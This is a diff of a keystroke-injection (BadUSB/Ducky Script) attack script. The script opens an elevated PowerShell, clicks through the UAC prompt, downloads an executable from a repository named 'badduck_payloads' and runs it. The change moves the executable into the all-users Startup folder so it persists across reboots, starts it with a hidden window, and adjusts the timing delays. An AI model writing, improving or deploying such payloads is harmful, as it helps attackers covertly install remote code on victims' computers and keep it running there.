@@ -8,12 +8,12 @@ DELAY 1000
 
 REM search powershell and run as admin
 STRING powershell
-DELAY 300
-CTRL SHIFT ENTER
 DELAY 500
+CTRL SHIFT ENTER
+DELAY 750
 ALT Y
-DELAY 1000
+DELAY 1500
 
 REM Download raw .exe payload from GitHub and execute
-STRING iwr 'https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/disco_info/dscinf.exe' -OutFile $env:TEMP\dscinf.exe; wscript $env:TEMP\dscinf.exe; exit
+STRING iwr 'https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/disco_info/dscinf.exe' -OutFile "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\dscinf.exe"; Start-Process "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\dscinf.exe" -WindowStyle Hidden; exit
 ENTER
